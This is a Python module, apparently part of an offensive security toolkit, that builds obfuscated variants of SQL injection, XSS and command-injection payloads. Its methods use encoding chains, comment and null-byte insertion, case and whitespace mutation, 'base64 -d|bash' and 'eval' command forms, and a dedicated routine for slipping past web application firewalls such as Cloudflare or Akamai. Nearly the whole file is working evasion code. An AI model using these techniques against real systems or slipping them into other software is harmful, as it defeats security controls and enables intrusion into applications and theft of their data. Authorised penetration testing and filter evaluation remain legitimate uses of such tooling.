"""
Advanced Payload Obfuscation Module
Generates obfuscated payloads to bypass security controls
"""
import base64
import urllib.parse
import random
import string
from typing import List, Dict
from utils.logger import get_logger
logger = get_logger(__name__)
class PayloadObfuscator:
    """Advanced payload obfuscation techniques."""
    def __init__(self, config: Dict):
        """Initialize payload obfuscator."""
        self.config = config
    def obfuscate_payload(self, payload: str, vuln_type: str) -> List[str]:
        """
        Generate multiple obfuscated versions of a payload.
        Args:
            payload: Original payload
            vuln_type: Type of vulnerability (sql, xss, etc.)
        Returns:
            List of obfuscated payloads
        """
        obfuscated = []
        obfuscated.append(self._url_encode(payload))
        obfuscated.append(self._double_url_encode(payload))
        obfuscated.append(self._unicode_encode(payload))
        obfuscated.append(self._hex_encode(payload))
        obfuscated.append(self._base64_encode(payload))
        obfuscated.append(self._case_variation(payload))
        obfuscated.append(self._comment_injection(payload, vuln_type))
        obfuscated.append(self._null_byte_injection(payload))
        obfuscated.append(self._whitespace_variation(payload))
        if vuln_type == 'sql_injection':
            obfuscated.extend(self._sql_obfuscation(payload))
        elif vuln_type == 'xss':
            obfuscated.extend(self._xss_obfuscation(payload))
        elif vuln_type == 'command_injection':
            obfuscated.extend(self._command_obfuscation(payload))
        return list(set(obfuscated))  # Remove duplicates
    def _url_encode(self, payload: str) -> str:
        """URL encode the payload."""
        return urllib.parse.quote(payload)
    def _double_url_encode(self, payload: str) -> str:
        """Double URL encode the payload."""
        encoded_once = urllib.parse.quote(payload)
        return urllib.parse.quote(encoded_once)
    def _unicode_encode(self, payload: str) -> str:
        """Unicode encode the payload."""
        return ''.join(f'\\u{ord(c):04x}' for c in payload)
    def _hex_encode(self, payload: str) -> str:
        """Hex encode the payload."""
        return ''.join(f'\\x{ord(c):02x}' for c in payload)
    def _base64_encode(self, payload: str) -> str:
        """Base64 encode the payload."""
        return base64.b64encode(payload.encode()).decode()
    def _case_variation(self, payload: str) -> str:
        """Vary case to bypass filters."""
        result = []
        for i, char in enumerate(payload):
            if i % 2 == 0:
                result.append(char.upper())
            else:
                result.append(char.lower())
        return ''.join(result)
    def _comment_injection(self, payload: str, vuln_type: str) -> str:
        """Inject comments to bypass filters."""
        if vuln_type == 'sql_injection':
            return payload.replace(' ', '/**/').replace('=', '/**/=/**/')
        elif vuln_type == 'xss':
            return payload.replace('<', '<!----><').replace('>', '><!---->')
        return payload
    def _null_byte_injection(self, payload: str) -> str:
        """Inject null bytes."""
        return payload.replace(' ', '%00 ')
    def _whitespace_variation(self, payload: str) -> str:
        """Vary whitespace characters."""
        variations = ['\t', '\n', '\r', ' ']
        result = payload
        for var in variations:
            if random.choice([True, False]):
                result = result.replace(' ', var, 1)
        return result
    def _sql_obfuscation(self, payload: str) -> List[str]:
        """SQL-specific obfuscation techniques."""
        obfuscated = []
        obfuscated.append(payload.upper())
        obfuscated.append(payload.lower())
        obfuscated.append(payload.replace(' ', '/**/'))
        obfuscated.append(payload.replace('SELECT', 'SEL/**/ECT'))
        obfuscated.append(payload.replace('UNION', 'UNI/**/ON'))
        obfuscated.append(payload.replace('OR 1=1', 'OR 2=2'))
        obfuscated.append(payload.replace('OR 1=1', 'OR "a"="a"'))
        obfuscated.append(payload.replace('=', ' LIKE '))
        obfuscated.append(payload.replace('SELECT', 'SEL'+'ECT'))
        obfuscated.append(payload.replace('1', '1e0'))
        if 'UNION' in payload.upper():
            obfuscated.append(payload.replace('UNION', 'UNION ALL'))
        return obfuscated
    def _xss_obfuscation(self, payload: str) -> List[str]:
        """XSS-specific obfuscation techniques."""
        obfuscated = []
        obfuscated.append(''.join(f'&#{ord(c)};' for c in payload))
        obfuscated.append(''.join(f'&#x{ord(c):x};' for c in payload))
        if '<script>' in payload.lower():
            obfuscated.append(payload.replace('<script>', '<ScRiPt>'))
            obfuscated.append(payload.replace('<script>', '<script '))
        obfuscated.append(payload.replace('onerror', 'on error'))
        obfuscated.append(payload.replace('onclick', 'on click'))
        obfuscated.append(payload.replace('<', '\\x3c').replace('>', '\\x3e'))
        if 'alert' in payload.lower():
            obfuscated.append(payload.replace('alert', 'confirm'))
            obfuscated.append(payload.replace('alert', 'prompt'))
            obfuscated.append(payload.replace('alert(', 'alert`'))
        if '<img' in payload.lower():
            obfuscated.append(payload.replace('src=', 'src=data:text/html,'))
        return obfuscated
    def _command_obfuscation(self, payload: str) -> List[str]:
        """Command injection obfuscation techniques."""
        obfuscated = []
        obfuscated.append(payload.replace('cat', 'c${empty}at'))
        obfuscated.append(payload.replace('ls', 'l${empty}s'))
        obfuscated.append(payload.replace('cat', 'c""at'))
        obfuscated.append(payload.replace('ls', 'l""s'))
        obfuscated.append(payload.replace('cat', 'c?t'))
        obfuscated.append(payload.replace('ls', 'l[s]'))
        if 'cat' in payload:
            cmd_b64 = base64.b64encode(b'cat').decode()
            obfuscated.append(f'echo {cmd_b64}|base64 -d|bash')
        obfuscated.append(payload.replace(';', '&&'))
        obfuscated.append(payload.replace(';', '||'))
        obfuscated.append(payload.replace(';', '|'))
        obfuscated.append(f'eval {payload}')
        return obfuscated
    def generate_polymorphic_payload(self, base_payload: str, count: int = 10) -> List[str]:
        """
        Generate polymorphic variations of a payload.
        Args:
            base_payload: Base payload
            count: Number of variations to generate
        Returns:
            List of polymorphic payloads
        """
        variations = []
        for _ in range(count):
            variation = base_payload
            transformations = [
                lambda p: self._url_encode(p),
                lambda p: self._case_variation(p),
                lambda p: self._whitespace_variation(p),
                lambda p: self._comment_injection(p, 'sql'),
                lambda p: p,  # No transformation
            ]
            transform = random.choice(transformations)
            variation = transform(variation)
            variations.append(variation)
        return list(set(variations))
    def encode_payload_chain(self, payload: str, encodings: List[str]) -> str:
        """
        Apply chain of encodings to payload.
        Args:
            payload: Original payload
            encodings: List of encoding types to apply in order
        Returns:
            Encoded payload
        """
        result = payload
        encoding_map = {
            'url': self._url_encode,
            'base64': self._base64_encode,
            'hex': self._hex_encode,
            'unicode': self._unicode_encode,
        }
        for encoding in encodings:
            if encoding in encoding_map:
                result = encoding_map[encoding](result)
        return result
    def bypass_waf_signature(self, payload: str, waf_type: str = 'generic') -> List[str]:
        """
        Generate payloads designed to bypass WAF signatures.
        Args:
            payload: Original payload
            waf_type: Type of WAF (generic, cloudflare, akamai, etc.)
        Returns:
            List of WAF bypass payloads
        """
        bypass_payloads = []
        bypass_payloads.append(payload.replace(' ', '/**/'))
        bypass_payloads.append(payload.replace(' ', '%09'))  # Tab
        bypass_payloads.append(payload.replace(' ', '%0a'))  # Newline
        bypass_payloads.append(payload.replace(' ', '%0d'))  # Carriage return
        bypass_payloads.append(self._double_url_encode(payload))
        encoded_chars = []
        for i, char in enumerate(payload):
            if i % 3 == 0:
                encoded_chars.append(f'%{ord(char):02x}')
            elif i % 3 == 1:
                encoded_chars.append(char)
            else:
                encoded_chars.append(f'&#x{ord(char):x};')
        bypass_payloads.append(''.join(encoded_chars))
        return bypass_payloads
